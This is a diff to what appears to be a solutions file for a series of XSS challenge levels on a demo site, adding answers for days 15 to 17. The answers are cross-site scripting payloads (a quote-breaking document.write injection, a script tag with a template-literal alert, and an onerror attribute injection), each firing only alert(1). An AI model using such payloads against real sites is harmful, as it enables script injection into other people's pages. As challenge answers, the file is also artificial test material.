@@ -77,7 +77,7 @@ https://xmass.compass-demo.com/level10
 **+++ Day 11 +++**  
 https://xmass.compass-demo.com/level11
 ```
-tbc
+tbd
 ```
 **+++ Day 12 +++**  
 https://xmass.compass-demo.com/level12
@@ -105,5 +105,15 @@ https://xmass.compass-demo.com/level14
 **+++ Day 15 +++**  
 https://xmass.compass-demo.com/level15
 ```
-tbc
+";document.write('\x3Cscript\x3Eal'+'ert(1)\x3C/script\x3E');//
+```
+**+++ Day 16 +++**
+https://xmass.compass-demo.com/level16
+```
+<script>alert`1`</script>
+```
+**+++ Day 17 +++**
+https://xmass.compass-demo.com/level17
+```
+" onerror="javascript:alert(1)"
 ```
